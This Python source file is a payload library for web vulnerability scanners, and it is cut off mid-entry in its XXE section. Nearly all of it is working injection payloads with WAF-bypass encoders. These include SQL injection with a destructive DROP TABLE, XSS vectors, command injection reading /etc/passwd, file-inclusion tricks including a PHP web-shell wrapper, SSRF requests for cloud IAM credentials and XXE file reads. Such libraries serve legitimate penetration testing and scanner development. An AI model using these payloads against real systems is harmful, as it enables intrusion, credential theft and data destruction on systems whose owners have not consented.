"""
Centralized Payload Library - Enterprise Edition

Eliminates 40-60% code duplication across scanners by providing:
- Categorized payloads (SQLi, XSS, CMDi, LFI, SSRF, XXE, SSTI)
- WAF bypass variants for each payload
- Database-specific payloads (MySQL, PostgreSQL, MSSQL, Oracle)
- Context-aware payloads (HTML tag, attribute, JS, URL)
- Success indicators for detection

Usage:
    from utils.payload_library import PayloadLibrary, PayloadCategory

    library = PayloadLibrary.get_instance()
    sqli_payloads = library.get_payloads(PayloadCategory.SQLI, db_type="mysql")
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Set
from urllib.parse import quote, quote_plus
import html
import base64


class PayloadCategory(Enum):
    """Categories of injection payloads."""
    SQLI = auto()
    XSS = auto()
    CMDI = auto()
    LFI = auto()
    RFI = auto()
    SSRF = auto()
    XXE = auto()
    SSTI = auto()
    LDAP = auto()
    XPATH = auto()
    NOSQL = auto()
    CRLF = auto()
    OPEN_REDIRECT = auto()


class WAFBypassTechnique(Enum):
    """WAF bypass encoding/obfuscation techniques."""
    NONE = auto()
    URL_ENCODE = auto()
    DOUBLE_URL_ENCODE = auto()
    UNICODE = auto()
    HEX = auto()
    CASE_VARIATION = auto()
    COMMENT_INSERTION = auto()
    WHITESPACE_VARIATION = auto()
    NULL_BYTE = auto()
    CONCAT_BREAK = auto()
    HTML_ENTITY = auto()
    BASE64 = auto()


class DatabaseType(Enum):
    """Database types for targeted payloads."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


class XSSContext(Enum):
    """XSS injection contexts."""
    HTML_TAG = "html_tag"
    HTML_ATTR = "html_attr"
    HTML_ATTR_QUOTED = "html_attr_quoted"
    JS_STRING = "js_string"
    JS_BLOCK = "js_block"
    URL = "url"
    CSS = "css"


@dataclass
class Payload:
    """Represents a single payload with metadata."""
    raw: str
    category: PayloadCategory
    description: str
    waf_bypasses: List[WAFBypassTechnique] = field(default_factory=list)
    db_type: Optional[str] = None
    context: Optional[str] = None
    success_indicators: List[str] = field(default_factory=list)
    severity: str = "medium"
    tags: Set[str] = field(default_factory=set)

    def get_variants(self, max_variants: int = 5) -> List[str]:
        """Generate WAF bypass variants of the payload."""
        variants = [self.raw]

        for bypass in self.waf_bypasses[:max_variants - 1]:
            variant = PayloadEncoder.apply_bypass(self.raw, bypass)
            if variant != self.raw:
                variants.append(variant)

        return variants[:max_variants]


class PayloadEncoder:
    """Static methods for encoding/obfuscating payloads."""

    @staticmethod
    def apply_bypass(payload: str, technique: WAFBypassTechnique) -> str:
        """Apply a WAF bypass technique to a payload."""
        if technique == WAFBypassTechnique.URL_ENCODE:
            return quote(payload, safe='')
        elif technique == WAFBypassTechnique.DOUBLE_URL_ENCODE:
            return quote(quote(payload, safe=''), safe='')
        elif technique == WAFBypassTechnique.UNICODE:
            return PayloadEncoder._unicode_encode(payload)
        elif technique == WAFBypassTechnique.HEX:
            return PayloadEncoder._hex_encode(payload)
        elif technique == WAFBypassTechnique.CASE_VARIATION:
            return PayloadEncoder._case_variation(payload)
        elif technique == WAFBypassTechnique.COMMENT_INSERTION:
            return PayloadEncoder._insert_comments(payload)
        elif technique == WAFBypassTechnique.WHITESPACE_VARIATION:
            return PayloadEncoder._whitespace_variation(payload)
        elif technique == WAFBypassTechnique.NULL_BYTE:
            return PayloadEncoder._null_byte_insertion(payload)
        elif technique == WAFBypassTechnique.HTML_ENTITY:
            return html.escape(payload)
        elif technique == WAFBypassTechnique.BASE64:
            return base64.b64encode(payload.encode()).decode()
        return payload

    @staticmethod
    def _unicode_encode(payload: str) -> str:
        """Encode characters as Unicode escape sequences."""
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    @staticmethod
    def _hex_encode(payload: str) -> str:
        """Encode as hex string."""
        return ''.join(f'%{ord(c):02x}' for c in payload)

    @staticmethod
    def _case_variation(payload: str) -> str:
        """Alternate case for SQL keywords."""
        keywords = ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE', 'INSERT',
                    'UPDATE', 'DELETE', 'DROP', 'SCRIPT', 'ALERT', 'ONERROR']
        result = payload
        for kw in keywords:
            # Mixed case: SeLeCt, UnIoN
            mixed = ''.join(c.upper() if i % 2 == 0 else c.lower()
                          for i, c in enumerate(kw))
            result = result.replace(kw.upper(), mixed)
            result = result.replace(kw.lower(), mixed)
        return result

    @staticmethod
    def _insert_comments(payload: str) -> str:
        """Insert SQL comments to break patterns."""
        # For SQL: SELECT -> SEL/**/ECT
        result = payload
        for kw in ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE']:
            if kw in result.upper():
                idx = result.upper().find(kw)
                mid = len(kw) // 2
                orig = result[idx:idx + len(kw)]
                commented = orig[:mid] + '/**/' + orig[mid:]
                result = result[:idx] + commented + result[idx + len(kw):]
        return result

    @staticmethod
    def _whitespace_variation(payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alternatives = ['\t', '\n', '\r', '/**/']
        import random
        result = ""
        for char in payload:
            if char == ' ':
                result += random.choice(alternatives)
            else:
                result += char
        return result

    @staticmethod
    def _null_byte_insertion(payload: str) -> str:
        """Insert null bytes to bypass filters."""
        return payload.replace(' ', '%00')


class PayloadLibrary:
    """Centralized library of security testing payloads."""

    _instance: Optional["PayloadLibrary"] = None

    @classmethod
    def get_instance(cls) -> "PayloadLibrary":
        """Get singleton instance."""
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    @classmethod
    def reset(cls) -> None:
        """Reset singleton (for testing)."""
        cls._instance = None

    def __init__(self) -> None:
        self._payloads: Dict[PayloadCategory, List[Payload]] = {}
        self._load_all_payloads()

    def _load_all_payloads(self) -> None:
        """Load all payload categories."""
        self._payloads = {
            PayloadCategory.SQLI: self._load_sqli_payloads(),
            PayloadCategory.XSS: self._load_xss_payloads(),
            PayloadCategory.CMDI: self._load_cmdi_payloads(),
            PayloadCategory.LFI: self._load_lfi_payloads(),
            PayloadCategory.SSRF: self._load_ssrf_payloads(),
            PayloadCategory.XXE: self._load_xxe_payloads(),
            PayloadCategory.SSTI: self._load_ssti_payloads(),
            PayloadCategory.NOSQL: self._load_nosql_payloads(),
            PayloadCategory.CRLF: self._load_crlf_payloads(),
            PayloadCategory.OPEN_REDIRECT: self._load_redirect_payloads(),
        }

    def get_payloads(
        self,
        category: PayloadCategory,
        db_type: Optional[str] = None,
        context: Optional[str] = None,
        with_waf_bypass: bool = True,
        max_payloads: int = 50,
        severity_filter: Optional[str] = None,
        tags: Optional[Set[str]] = None,
    ) -> List[str]:
        """
        Get payloads filtered by criteria.

        Args:
            category: Payload category (SQLI, XSS, etc.)
            db_type: Database type filter (mysql, postgresql, etc.)
            context: Context filter (html_tag, js_string, etc.)
            with_waf_bypass: Include WAF bypass variants
            max_payloads: Maximum number of payloads to return
            severity_filter: Filter by severity (critical, high, medium, low)
            tags: Filter by tags

        Returns:
            List of payload strings
        """
        payloads = self._payloads.get(category, [])

        # Apply filters
        if db_type:
            payloads = [p for p in payloads if p.db_type is None or p.db_type == db_type]
        if context:
            payloads = [p for p in payloads if p.context is None or p.context == context]
        if severity_filter:
            payloads = [p for p in payloads if p.severity == severity_filter]
        if tags:
            payloads = [p for p in payloads if tags.intersection(p.tags)]

        result = []
        for p in payloads:
            if with_waf_bypass:
                result.extend(p.get_variants())
            else:
                result.append(p.raw)

            if len(result) >= max_payloads:
                break

        return result[:max_payloads]

    def get_payload_objects(
        self,
        category: PayloadCategory,
        **filters
    ) -> List[Payload]:
        """Get full Payload objects (not just strings)."""
        payloads = self._payloads.get(category, [])

        if filters.get("db_type"):
            payloads = [p for p in payloads if p.db_type is None or p.db_type == filters["db_type"]]
        if filters.get("context"):
            payloads = [p for p in payloads if p.context is None or p.context == filters["context"]]

        return payloads

    def get_success_indicators(self, category: PayloadCategory) -> List[str]:
        """Get all success indicators for a category."""
        indicators = set()
        for payload in self._payloads.get(category, []):
            indicators.update(payload.success_indicators)
        return list(indicators)

    # =====================
    # SQLi Payloads
    # =====================
    def _load_sqli_payloads(self) -> List[Payload]:
        return [
            # Boolean-based
            Payload(
                raw="' OR '1'='1",
                category=PayloadCategory.SQLI,
                description="Basic boolean bypass",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE, WAFBypassTechnique.COMMENT_INSERTION],
                success_indicators=["error", "mysql", "syntax", "warning"],
                severity="high",
                tags={"boolean", "basic"}
            ),
            Payload(
                raw="' OR 1=1--",
                category=PayloadCategory.SQLI,
                description="Comment-terminated boolean",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE, WAFBypassTechnique.CASE_VARIATION],
                success_indicators=["error", "mysql", "sqlite"],
                severity="high",
                tags={"boolean", "comment"}
            ),
            Payload(
                raw="1' AND '1'='1",
                category=PayloadCategory.SQLI,
                description="AND-based boolean",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="medium",
                tags={"boolean", "and"}
            ),
            Payload(
                raw="' OR ''='",
                category=PayloadCategory.SQLI,
                description="Empty string boolean",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="medium",
                tags={"boolean"}
            ),
            Payload(
                raw="') OR ('1'='1",
                category=PayloadCategory.SQLI,
                description="Parenthesis bypass",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"boolean", "parenthesis"}
            ),

            # Time-based blind - MySQL
            Payload(
                raw="1' AND SLEEP(5)--",
                category=PayloadCategory.SQLI,
                description="MySQL time-based blind",
                db_type="mysql",
                waf_bypasses=[WAFBypassTechnique.COMMENT_INSERTION, WAFBypassTechnique.CASE_VARIATION],
                severity="critical",
                tags={"time-based", "blind", "mysql"}
            ),
            Payload(
                raw="1' AND BENCHMARK(5000000,MD5('test'))--",
                category=PayloadCategory.SQLI,
                description="MySQL BENCHMARK time-based",
                db_type="mysql",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="critical",
                tags={"time-based", "blind", "mysql"}
            ),

            # Time-based blind - PostgreSQL
            Payload(
                raw="1'; SELECT pg_sleep(5)--",
                category=PayloadCategory.SQLI,
                description="PostgreSQL time-based blind",
                db_type="postgresql",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="critical",
                tags={"time-based", "blind", "postgresql"}
            ),

            # Time-based blind - MSSQL
            Payload(
                raw="1'; WAITFOR DELAY '0:0:5'--",
                category=PayloadCategory.SQLI,
                description="MSSQL time-based blind",
                db_type="mssql",
                waf_bypasses=[],
                severity="critical",
                tags={"time-based", "blind", "mssql"}
            ),

            # UNION-based
            Payload(
                raw="' UNION SELECT NULL--",
                category=PayloadCategory.SQLI,
                description="UNION column enumeration (1)",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION, WAFBypassTechnique.COMMENT_INSERTION],
                severity="high",
                tags={"union"}
            ),
            Payload(
                raw="' UNION SELECT NULL,NULL--",
                category=PayloadCategory.SQLI,
                description="UNION column enumeration (2)",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"union"}
            ),
            Payload(
                raw="' UNION SELECT NULL,NULL,NULL--",
                category=PayloadCategory.SQLI,
                description="UNION column enumeration (3)",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"union"}
            ),
            Payload(
                raw="' UNION SELECT 1,2,3,4,5--",
                category=PayloadCategory.SQLI,
                description="UNION with numbers",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"union"}
            ),
            Payload(
                raw="' UNION ALL SELECT NULL,NULL,NULL--",
                category=PayloadCategory.SQLI,
                description="UNION ALL variant",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"union"}
            ),

            # Error-based - MySQL
            Payload(
                raw="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                category=PayloadCategory.SQLI,
                description="MySQL EXTRACTVALUE error-based",
                db_type="mysql",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                success_indicators=["XPATH syntax error"],
                severity="critical",
                tags={"error-based", "mysql"}
            ),
            Payload(
                raw="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
                category=PayloadCategory.SQLI,
                description="MySQL double query error-based",
                db_type="mysql",
                waf_bypasses=[],
                severity="critical",
                tags={"error-based", "mysql"}
            ),

            # Stacked queries
            Payload(
                raw="'; DROP TABLE users--",
                category=PayloadCategory.SQLI,
                description="Stacked query (destructive - test only)",
                waf_bypasses=[],
                severity="critical",
                tags={"stacked", "destructive"}
            ),

            # Authentication bypass
            Payload(
                raw="admin'--",
                category=PayloadCategory.SQLI,
                description="Admin comment bypass",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"auth-bypass"}
            ),
            Payload(
                raw="admin' OR '1'='1'--",
                category=PayloadCategory.SQLI,
                description="Admin OR bypass",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"auth-bypass"}
            ),
            Payload(
                raw="' OR 1=1 LIMIT 1--",
                category=PayloadCategory.SQLI,
                description="Limit to first result",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"auth-bypass"}
            ),

            # WAF bypass variants
            Payload(
                raw="' /*!50000OR*/ '1'='1",
                category=PayloadCategory.SQLI,
                description="MySQL version comment bypass",
                db_type="mysql",
                waf_bypasses=[],
                severity="high",
                tags={"waf-bypass", "mysql"}
            ),
            Payload(
                raw="'/**/OR/**/1=1--",
                category=PayloadCategory.SQLI,
                description="Comment space bypass",
                waf_bypasses=[],
                severity="high",
                tags={"waf-bypass"}
            ),
            Payload(
                raw="'%09OR%091=1--",
                category=PayloadCategory.SQLI,
                description="Tab character bypass",
                waf_bypasses=[],
                severity="high",
                tags={"waf-bypass"}
            ),
        ]

    # =====================
    # XSS Payloads
    # =====================
    def _load_xss_payloads(self) -> List[Payload]:
        return [
            # Basic script tags
            Payload(
                raw="<script>alert(1)</script>",
                category=PayloadCategory.XSS,
                description="Basic script alert",
                context="html_tag",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION, WAFBypassTechnique.UNICODE],
                success_indicators=["<script>", "alert"],
                severity="high",
                tags={"basic", "script"}
            ),
            Payload(
                raw="<script>alert(String.fromCharCode(88,83,83))</script>",
                category=PayloadCategory.XSS,
                description="Script with char encoding",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"encoding", "script"}
            ),
            Payload(
                raw="<script>alert`1`</script>",
                category=PayloadCategory.XSS,
                description="Template literal alert",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"basic", "script"}
            ),

            # Event handlers
            Payload(
                raw="<img src=x onerror=alert(1)>",
                category=PayloadCategory.XSS,
                description="IMG onerror",
                context="html_tag",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE, WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"event", "img"}
            ),
            Payload(
                raw="<svg onload=alert(1)>",
                category=PayloadCategory.XSS,
                description="SVG onload",
                context="html_tag",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"event", "svg"}
            ),
            Payload(
                raw="<body onload=alert(1)>",
                category=PayloadCategory.XSS,
                description="Body onload",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"event", "body"}
            ),
            Payload(
                raw="<input onfocus=alert(1) autofocus>",
                category=PayloadCategory.XSS,
                description="Input autofocus",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"event", "input"}
            ),
            Payload(
                raw="<marquee onstart=alert(1)>",
                category=PayloadCategory.XSS,
                description="Marquee onstart",
                context="html_tag",
                waf_bypasses=[],
                severity="medium",
                tags={"event", "marquee"}
            ),
            Payload(
                raw="<details open ontoggle=alert(1)>",
                category=PayloadCategory.XSS,
                description="Details ontoggle",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"event", "details"}
            ),

            # JavaScript protocol
            Payload(
                raw="javascript:alert(1)",
                category=PayloadCategory.XSS,
                description="JavaScript protocol",
                context="html_attr",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION, WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"protocol"}
            ),
            Payload(
                raw="javascript:alert(document.domain)",
                category=PayloadCategory.XSS,
                description="JavaScript domain leak",
                context="html_attr",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"protocol", "domain"}
            ),

            # Attribute injection
            Payload(
                raw='" onmouseover="alert(1)',
                category=PayloadCategory.XSS,
                description="Attribute escape onmouseover",
                context="html_attr_quoted",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"attribute", "event"}
            ),
            Payload(
                raw="' onclick='alert(1)'",
                category=PayloadCategory.XSS,
                description="Single quote attribute",
                context="html_attr_quoted",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"attribute", "event"}
            ),

            # JS context
            Payload(
                raw="'-alert(1)-'",
                category=PayloadCategory.XSS,
                description="JS string break with arithmetic",
                context="js_string",
                waf_bypasses=[],
                severity="high",
                tags={"js", "string-break"}
            ),
            Payload(
                raw="';alert(1)//",
                category=PayloadCategory.XSS,
                description="JS string terminate",
                context="js_string",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"js", "string-break"}
            ),
            Payload(
                raw="</script><script>alert(1)</script>",
                category=PayloadCategory.XSS,
                description="Script tag break",
                context="js_block",
                waf_bypasses=[],
                severity="high",
                tags={"js", "tag-break"}
            ),

            # Polyglot
            Payload(
                raw="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
                category=PayloadCategory.XSS,
                description="XSS Polyglot",
                waf_bypasses=[],
                severity="high",
                tags={"polyglot"}
            ),

            # DOM-based indicators
            Payload(
                raw="#<img src=x onerror=alert(1)>",
                category=PayloadCategory.XSS,
                description="Hash-based DOM XSS",
                context="url",
                waf_bypasses=[],
                severity="high",
                tags={"dom", "hash"}
            ),

            # Filter bypass
            Payload(
                raw="<ScRiPt>alert(1)</ScRiPt>",
                category=PayloadCategory.XSS,
                description="Mixed case bypass",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"waf-bypass", "case"}
            ),
            Payload(
                raw="<scr<script>ipt>alert(1)</scr</script>ipt>",
                category=PayloadCategory.XSS,
                description="Nested tag bypass",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"waf-bypass", "nested"}
            ),
            Payload(
                raw="<svg/onload=alert(1)>",
                category=PayloadCategory.XSS,
                description="No space SVG",
                context="html_tag",
                waf_bypasses=[],
                severity="high",
                tags={"waf-bypass", "svg"}
            ),
        ]

    # =====================
    # Command Injection Payloads
    # =====================
    def _load_cmdi_payloads(self) -> List[Payload]:
        return [
            # Basic operators
            Payload(
                raw="; id",
                category=PayloadCategory.CMDI,
                description="Semicolon command chain",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"basic", "unix"}
            ),
            Payload(
                raw="| id",
                category=PayloadCategory.CMDI,
                description="Pipe command",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"basic", "unix"}
            ),
            Payload(
                raw="|| id",
                category=PayloadCategory.CMDI,
                description="OR operator",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"basic", "unix"}
            ),
            Payload(
                raw="&& id",
                category=PayloadCategory.CMDI,
                description="AND operator",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"basic", "unix"}
            ),
            Payload(
                raw="& id",
                category=PayloadCategory.CMDI,
                description="Background operator",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"basic", "unix"}
            ),

            # Command substitution
            Payload(
                raw="`id`",
                category=PayloadCategory.CMDI,
                description="Backtick substitution",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"substitution", "unix"}
            ),
            Payload(
                raw="$(id)",
                category=PayloadCategory.CMDI,
                description="Dollar substitution",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"substitution", "unix"}
            ),

            # Windows commands
            Payload(
                raw="& whoami",
                category=PayloadCategory.CMDI,
                description="Windows whoami",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["\\", "administrator", "system"],
                severity="critical",
                tags={"basic", "windows"}
            ),
            Payload(
                raw="| dir",
                category=PayloadCategory.CMDI,
                description="Windows dir",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["<DIR>", "Volume"],
                severity="critical",
                tags={"basic", "windows"}
            ),

            # Blind detection
            Payload(
                raw="; sleep 5",
                category=PayloadCategory.CMDI,
                description="Blind sleep (Unix)",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="critical",
                tags={"blind", "unix"}
            ),
            Payload(
                raw="| ping -c 5 127.0.0.1",
                category=PayloadCategory.CMDI,
                description="Blind ping (Unix)",
                waf_bypasses=[],
                severity="critical",
                tags={"blind", "unix"}
            ),
            Payload(
                raw="& ping -n 5 127.0.0.1",
                category=PayloadCategory.CMDI,
                description="Blind ping (Windows)",
                waf_bypasses=[],
                severity="critical",
                tags={"blind", "windows"}
            ),

            # Filter bypass
            Payload(
                raw=";{id}",
                category=PayloadCategory.CMDI,
                description="Brace bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"waf-bypass"}
            ),
            Payload(
                raw=";i'd'",
                category=PayloadCategory.CMDI,
                description="Quote bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"waf-bypass"}
            ),
            Payload(
                raw=";$IFS$9id",
                category=PayloadCategory.CMDI,
                description="IFS variable bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"waf-bypass", "unix"}
            ),
            Payload(
                raw=";cat${IFS}/etc/passwd",
                category=PayloadCategory.CMDI,
                description="IFS space bypass",
                waf_bypasses=[],
                success_indicators=["root:", "bin:", "nobody:"],
                severity="critical",
                tags={"waf-bypass", "unix"}
            ),
        ]

    # =====================
    # LFI Payloads
    # =====================
    def _load_lfi_payloads(self) -> List[Payload]:
        return [
            # Basic traversal
            Payload(
                raw="../../../etc/passwd",
                category=PayloadCategory.LFI,
                description="Basic traversal",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE, WAFBypassTechnique.DOUBLE_URL_ENCODE],
                success_indicators=["root:", "bin:", "nobody:", "daemon:"],
                severity="high",
                tags={"basic", "unix"}
            ),
            Payload(
                raw="....//....//....//etc/passwd",
                category=PayloadCategory.LFI,
                description="Filter bypass traversal",
                waf_bypasses=[],
                success_indicators=["root:", "bin:"],
                severity="high",
                tags={"waf-bypass", "unix"}
            ),
            Payload(
                raw="..%252f..%252f..%252fetc/passwd",
                category=PayloadCategory.LFI,
                description="Double URL encoded",
                waf_bypasses=[],
                success_indicators=["root:", "bin:"],
                severity="high",
                tags={"encoding", "unix"}
            ),

            # Null byte (legacy PHP)
            Payload(
                raw="../../../etc/passwd%00",
                category=PayloadCategory.LFI,
                description="Null byte termination",
                waf_bypasses=[],
                success_indicators=["root:", "bin:"],
                severity="high",
                tags={"null-byte", "unix"}
            ),

            # PHP wrappers
            Payload(
                raw="php://filter/convert.base64-encode/resource=index.php",
                category=PayloadCategory.LFI,
                description="PHP base64 filter",
                waf_bypasses=[],
                success_indicators=["PD9waHA"],
                severity="critical",
                tags={"php", "wrapper"}
            ),
            Payload(
                raw="php://filter/read=string.rot13/resource=index.php",
                category=PayloadCategory.LFI,
                description="PHP ROT13 filter",
                waf_bypasses=[],
                severity="critical",
                tags={"php", "wrapper"}
            ),
            Payload(
                raw="php://input",
                category=PayloadCategory.LFI,
                description="PHP input stream (RCE)",
                waf_bypasses=[],
                severity="critical",
                tags={"php", "wrapper", "rce"}
            ),
            Payload(
                raw="data://text/plain,<?php system($_GET['cmd']); ?>",
                category=PayloadCategory.LFI,
                description="PHP data wrapper RCE",
                waf_bypasses=[],
                severity="critical",
                tags={"php", "wrapper", "rce"}
            ),

            # Windows paths
            Payload(
                raw="..\\..\\..\\windows\\win.ini",
                category=PayloadCategory.LFI,
                description="Windows win.ini",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["[fonts]", "[extensions]"],
                severity="high",
                tags={"basic", "windows"}
            ),
            Payload(
                raw="..\\..\\..\\boot.ini",
                category=PayloadCategory.LFI,
                description="Windows boot.ini",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                success_indicators=["boot loader", "operating systems"],
                severity="high",
                tags={"basic", "windows"}
            ),

            # Sensitive files
            Payload(
                raw="../../../proc/self/environ",
                category=PayloadCategory.LFI,
                description="Process environment",
                waf_bypasses=[],
                success_indicators=["PATH=", "HOME=", "USER="],
                severity="high",
                tags={"proc", "unix"}
            ),
            Payload(
                raw="../../../proc/self/cmdline",
                category=PayloadCategory.LFI,
                description="Process command line",
                waf_bypasses=[],
                severity="high",
                tags={"proc", "unix"}
            ),
            Payload(
                raw="../../../var/log/apache2/access.log",
                category=PayloadCategory.LFI,
                description="Apache access log",
                waf_bypasses=[],
                severity="high",
                tags={"logs", "unix"}
            ),
        ]

    # =====================
    # SSRF Payloads
    # =====================
    def _load_ssrf_payloads(self) -> List[Payload]:
        return [
            # Localhost variants
            Payload(
                raw="http://127.0.0.1",
                category=PayloadCategory.SSRF,
                description="Localhost IP",
                waf_bypasses=[],
                severity="high",
                tags={"localhost"}
            ),
            Payload(
                raw="http://localhost",
                category=PayloadCategory.SSRF,
                description="Localhost hostname",
                waf_bypasses=[],
                severity="high",
                tags={"localhost"}
            ),
            Payload(
                raw="http://[::1]",
                category=PayloadCategory.SSRF,
                description="IPv6 localhost",
                waf_bypasses=[],
                severity="high",
                tags={"localhost", "ipv6"}
            ),
            Payload(
                raw="http://0.0.0.0",
                category=PayloadCategory.SSRF,
                description="All interfaces",
                waf_bypasses=[],
                severity="high",
                tags={"localhost"}
            ),
            Payload(
                raw="http://0177.0.0.1",
                category=PayloadCategory.SSRF,
                description="Octal localhost",
                waf_bypasses=[],
                severity="high",
                tags={"localhost", "encoding"}
            ),
            Payload(
                raw="http://2130706433",
                category=PayloadCategory.SSRF,
                description="Decimal localhost",
                waf_bypasses=[],
                severity="high",
                tags={"localhost", "encoding"}
            ),

            # Cloud metadata
            Payload(
                raw="http://169.254.169.254/latest/meta-data/",
                category=PayloadCategory.SSRF,
                description="AWS metadata",
                waf_bypasses=[],
                success_indicators=["ami-id", "instance-id", "iam"],
                severity="critical",
                tags={"cloud", "aws"}
            ),
            Payload(
                raw="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                category=PayloadCategory.SSRF,
                description="AWS IAM credentials",
                waf_bypasses=[],
                success_indicators=["AccessKeyId", "SecretAccessKey"],
                severity="critical",
                tags={"cloud", "aws", "credentials"}
            ),
            Payload(
                raw="http://metadata.google.internal/computeMetadata/v1/",
                category=PayloadCategory.SSRF,
                description="GCP metadata",
                waf_bypasses=[],
                severity="critical",
                tags={"cloud", "gcp"}
            ),
            Payload(
                raw="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                category=PayloadCategory.SSRF,
                description="Azure metadata",
                waf_bypasses=[],
                severity="critical",
                tags={"cloud", "azure"}
            ),

            # Internal services
            Payload(
                raw="http://127.0.0.1:22",
                category=PayloadCategory.SSRF,
                description="SSH port probe",
                waf_bypasses=[],
                severity="medium",
                tags={"port-scan"}
            ),
            Payload(
                raw="http://127.0.0.1:3306",
                category=PayloadCategory.SSRF,
                description="MySQL port probe",
                waf_bypasses=[],
                severity="medium",
                tags={"port-scan"}
            ),
            Payload(
                raw="http://127.0.0.1:6379",
                category=PayloadCategory.SSRF,
                description="Redis port probe",
                waf_bypasses=[],
                severity="medium",
                tags={"port-scan"}
            ),

            # File protocol
            Payload(
                raw="file:///etc/passwd",
                category=PayloadCategory.SSRF,
                description="File protocol read",
                waf_bypasses=[],
                success_indicators=["root:", "bin:"],
                severity="critical",
                tags={"file", "unix"}
            ),

            # Filter bypass
            Payload(
                raw="http://127.1",
                category=PayloadCategory.SSRF,
                description="Short localhost",
                waf_bypasses=[],
                severity="high",
                tags={"localhost", "bypass"}
            ),
            Payload(
                raw="http://127.0.0.1.nip.io",
                category=PayloadCategory.SSRF,
                description="DNS rebinding",
                waf_bypasses=[],
                severity="high",
                tags={"dns-rebind"}
            ),
        ]

    # =====================
    # XXE Payloads
    # =====================
    def _load_xxe_payloads(self) -> List[Payload]:
        return [
            # Basic file read
            Payload(
                raw='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                category=PayloadCategory.XXE,
                description="Basic file read",
                waf_bypasses=[],
                success_indicators=["root:", "bin:"],
                severity="critical",
                tags={"file", "unix"}
            ),
            Payload(
                raw='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                category=PayloadCategory.XXE,
                description="Windows file read",
                waf_bypasses=[],
                success_indicators=["[fonts]"],
                severity="critical",
                tags={"file", "windows"}
            ),

            # SSRF via XXE
            Payload(
